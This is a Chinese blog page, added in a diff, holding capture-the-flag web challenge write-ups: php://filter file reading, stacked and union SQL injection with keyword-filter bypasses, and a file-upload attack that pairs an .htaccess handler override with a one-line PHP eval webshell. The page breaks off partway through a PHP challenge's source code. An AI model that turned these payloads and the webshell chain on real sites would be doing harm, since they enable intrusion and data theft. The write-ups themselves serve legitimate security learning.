@@ -1,0 +1,1224 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Buff的Web, Ntrack">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Buff的Web | Ntrack</title>
+    <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/favicon.jpg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Ntrack</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Ntrack</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/NTrack/ntrack.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/NTrack/ntrack.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Buff的Web</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Buff/">
+                                <span class="chip bg-color">Buff</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E9%A2%98%E7%9B%AE%E9%9B%86/" class="post-category">
+                                题目集
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-06-04
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-12
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ntrack/ntrack.github.io/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="ACTF2020-新生赛-Include1"><a href="#ACTF2020-新生赛-Include1" class="headerlink" title="[ACTF2020 新生赛]Include1"></a>[ACTF2020 新生赛]Include1</h2><p>考点：文件包含</p>
+<blockquote>
+<p>查看了源码和数据包，发现没有想要的信息，又爆破的一波目录，并没有有用目录，几乎都指向index.php，突然灵光一闪，想着会不会是无法显示的信息，然后用PHP伪协议进行base64编码，发现了一串编码，然后解码获取flag。</p>
+</blockquote>
+<p>使用是伪协议：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+<blockquote>
+<p>filter：滤器</p>
+<p>该协议的作用：作为一个中间流来处理其他流，可以进行任意文件的读取(获取页面源码)</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/540864302">伪协议了解</a></p>
+<h2 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h2><p>考点：sql注入</p>
+<p>操作过程：</p>
+<blockquote>
+<p>发现输入1，2都正常，然后输入3以上就没有结果了。然后尝试输入单引号，发现报错，于是猜测这是单引号闭合，尝试使用1’ or ‘1’&#x3D; ‘1 –+，发现正常，确认是单引号闭合。使用1’ order by 1,2,3 –+发现错误，即最多回显2个字段信息。使用0’ select databse(),2 –+发现select等等一些关键字被禁用<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309071036414.png"></p>
+<p>select被禁用导致了很多的方法都无法使用了，其中包括了联合、布尔注入和时间盲注。尝试堆叠注入。</p>
+<blockquote>
+<p>堆叠注入的原理是因为mysql支持多个语句一起执行，不过需要用” ; “分隔开</p>
+</blockquote>
+<p>查看mysql的命令，执行查看数据库的命令：1’;show databases ; –+，发现可行，返回数据库信息。然后发现了”ctftraining“的数据库，然后执行1’;use ctftraining;show tables–+，发现了”FLAG_TABLE“字段，使用1’;use ctftraining;show columns from FLAG_TABLE–+发现提示not_flag，flag不在这里，直接执行1’;show tables –+查看所有表，发现了两个表<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309071122904.png"></p>
+<p>然后查看其中的字段，查看第一个表1’; show columns from `1919810931114514` –+,终于发现了flag。然后就做不下去了，因为select被禁用，想过用sel&lt;&gt;ect绕过，但是发现不行，最后没有想法看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-103239145-blog-123292860.235%5Ev38%5Epc_relevant_sort_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-103239145-blog-123292860.235%5Ev38%5Epc_relevant_sort_base3&utm_relevant_index=1">wp</a></p>
+<blockquote>
+<p>wp1：使用prepare ..from 和excute 进行16进制编码绕过</p>
+<p>select `flag` from   `1919810931114514` 的十六进制：0x73656C6563742060666C6167602066726F6D20603139313938313039333131313435313460</p>
+<p>payload：1’;Set @a&#x3D;0x73656C6563742060666C6167602066726F6D20603139313938313039333131313435313460;prepare exesql from @a;execute exesql –+	</p>
+<p>&#x2F;&#x2F;发现set和prepare同时使用会被检测，于是变换set为Set等等</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">mysql预处理</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lqx_sunhan/article/details/79852063#2.%E8%BF%99%E4%B8%AA%E8%AF%AD%E6%B3%95%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84">prepare语句</a></p>
+</blockquote>
+<blockquote>
+<p>wp2：使用handler 语句（mysql特殊语句）</p>
+<p>payload：1’;handler `1919810931114514`  open;handler `1919810931114514` read next –+</p>
+<p>&#x2F;&#x2F;打开数据表，然后按索引读表中的字段内容</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">handler 姿势</a></p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官网介绍</a></p>
+</blockquote>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44870139/article/details/105555238">mysql操作命令</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/606363356">mysql查看版本信息</a></p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>考点: sql注入</p>
+<blockquote>
+<p>尝试输入1,2,3都可以返回数字,输入单引号后没有内容输出,而使用双引号发现返回nonono;以为是双引号闭合,但是验证闭合的结果和输入双引号一样,无法确定.再次输入一些关键字,发现结果和输入双引号一样的内容输出nonono.例如:from、handler….，但是可以使用分号，于是尝试了一下堆叠 注入，输入了1;show databases –+和1;show databases都没有有效输出，然后修改注释符号1;show databases#发现返回有效内容，查看表1;show tables#发现了Flag；可是剩下弄了一波没有办法操作了. 看了wp ,造成输入数字和字母区别的问题在于sql语句的原型是</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">></span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span>$post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>就是对输入的参数过滤后然后进行连接,其中||是或操作,即select [咩咩] || flag from Flag,如果咩咩是数字则进行或操作,可以得到1或者0的结果映射出来,而如果是字母则无法映射结果,无输出.再测试发现&amp;&amp;也可以这样的</p>
+</blockquote>
+<blockquote>
+<p>wp1:使用逗号进行分割</p>
+<p>payload: *,1		&#x2F;&#x2F;即select *, 1 || flag from Flag ,将 * 和1|| flag作为两个字段名称,所以可以直接输出Flag的全部信息</p>
+</blockquote>
+<blockquote>
+<p>wp2:将||修改成为连接符（对&amp;&amp;无效）</p>
+<p>payload: 1;set sql_mode&#x3D;pipes_as_concat;select 1		&#x2F;&#x2F;即select 1;set sql_mode&#x3D;pipes_as_concat;select 1 || flag from Flag；	（1||flag会将1和flag的内容连接）</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/clschao/articles/9962347.html">sql_mode</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lixora/article/details/60572357">mysql 修改sql_mode 实现字符串管道‘||’连接</a></p>
+</blockquote>
+<h2 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h2><p>考点: sql注入</p>
+<p>输入账号密码，然后使用hackbar测试。测试内容是对账号的添加单引号，双引号，变形括号，当输入单引号的时候便发现了报错，再验证信息username&#x3D;1’ or ‘1’&#x3D;’1–+&amp;password&#x3D;1，发现正常返回，于是确定是单引号闭合。</p>
+<p>使用order by语句测试可返回字段<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101229933.png"></p>
+<p>发现过滤了<strong>or和by</strong>，使用双写绕过?username&#x3D;0’ oorrder bbyy 1,2,3,4 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101230114.png"></p>
+<p>发现了只能返回3个字段，于是查看哪些是显位?username&#x3D;0’union select 1,2,3 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101318776.png"></p>
+<p>发现过滤了<strong>union和select</strong>，于是继续绕过?username&#x3D;0’ununionion seselectlect 1,2,3 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101234428.png"></p>
+<p>查看数据库?username&#x3D;0’ununionion seselectlect 1,database(),3 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101235567.png"></p>
+<p>查看表名，发现过滤了where和from</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101239835.png"></p>
+<p>继续绕?username&#x3D;0’ununionion seselectlect 1,(seselectlect  group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema &#x3D; database()),3 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101240096.png"></p>
+<p>查看b4bsql：?username&#x3D;0’ununionion seselectlect 1,(seselectlect  group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name &#x3D; ‘b4bsql’),3 –+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101242476.png"></p>
+<p>查看字段username和password：?username&#x3D;0’ununionion seselectlect 1,(selselectect group_concat(username,0x26,passwoorrd) frfromom b4bsql),3–+&amp;password&#x3D;1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101257275.png"></p>
+<p>上面的password也需要双写or成passwoorrd，最后获得flag：flag{8326e006-a228-457d-bd23-e7efa2403d76}</p>
+<blockquote>
+<p>双写绕过：</p>
+<p>模型大概使用preg_replace()或者str_replace()将特定的字符替换成空，然后导致无法输入原来的内容。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token operator">></span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"from"</span><span class="token punctuation">;</span>
+<span class="token operator">></span><span class="token keyword">echo</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"from"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//将$sql中的from替换成空</span>
+<span class="token operator">></span><span class="token comment">//输出结果是:空</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用双写绕过大概的方法就是重复写多一次想要输入内容在中间，让函数替换成空最后连接成为原来想要输入的内容</p>
+<p>比如：</p>
+<ul>
+<li>select     通过双写绕过就是 sel<strong>select</strong>ect，可以看到标黑部分就是想要输入的，然后被替换成空后得到select</li>
+<li>from      通过双写绕过就是fr<strong>from</strong>om，将其中的一个from替换成空后还是from</li>
+</ul>
+<p>其他的也一样，只不过需要在测试的时候看看是哪些字符被替换成空了</p>
+</blockquote>
+<h2 id="MRCTF2020-你传你🐎呢-1"><a href="#MRCTF2020-你传你🐎呢-1" class="headerlink" title="[MRCTF2020]你传你🐎呢 1"></a>[MRCTF2020]你传你🐎呢 1</h2><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111120202.png"></p>
+<p>上传的文件内容是&lt;?php @eval($_POST[‘cmd’]); ?&gt;，发现<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111122495.png">，估计是被过滤了php，然后认为是后缀名有问题，就爆破了php可执行的文件后缀，可是发现没有一个可以通过的。然后我尝试了禁用js，看看是否是js导致过滤了这些内容，禁用后发现并没有效果，但是可以上传jpg类型的文件即Content-Type为image&#x2F;jpeg（发现image&#x2F;png也可，但是文件内容太大都不行）<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111204989.png">然后新手表示没办法了。看了wp后学习到了新知识。使用的是.htaccess解析漏洞，就是将携带webshell的图片修改为php可执行文件</p>
+<blockquote>
+<p>.htaccess文件内容：</p>
+<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&gt;&lt;FilesMatch &quot;1.jpg&quot;&gt;
+&gt;Sethandler application&#x2F;x-httpd-php	
+&gt;&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
+&gt;&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>webshell：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">></span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p>先上传.htaccess文件（需要修改Content-Type类型），目的是修改目录及子目录的配置，然后再上传带有webshell的1.jpg，最后用蚁剑连接获取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111242930.png"></p>
+<blockquote>
+<p>MIME类型就是服务端会检测Content-Type的值</p>
+<p>常见的MIME类型有：image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42368885/article/details/103182896">文件上传之MIME类型绕过</a></p>
+<blockquote>
+<p>.htaccess文件是<strong>Apache服务器</strong>下的一个配置文件,在本题大概<a target="_blank" rel="noopener" href="https://www.cnblogs.com/engeng/articles/5948089.html">作用</a>就是<strong>将标记文件映射为php可执行文件</strong>，作用域为其所在目录与其所有的子目录,若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果</p>
+<p>写法：</p>
+<ul>
+<li>Sethandler 指令：<br> 将该目录及子目录的所有文件均映射为php文件类型</li>
+<li>Addhandler 指令：<br> 使用 php5-script 处理器来解析所匹配到的文件</li>
+<li>AddType 指令<br> 将特定扩展名文件映射为php文件类型</li>
+</ul>
+</blockquote>
+<p><strong>burp suite重新发送文件会覆盖原来命名的文件</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess介绍</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12078206.html">一句话木马变形</a></p>
+<h2 id="羊城杯2020-easyphp-1"><a href="#羊城杯2020-easyphp-1" class="headerlink" title="[羊城杯2020]easyphp 1"></a>[羊城杯2020]easyphp 1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
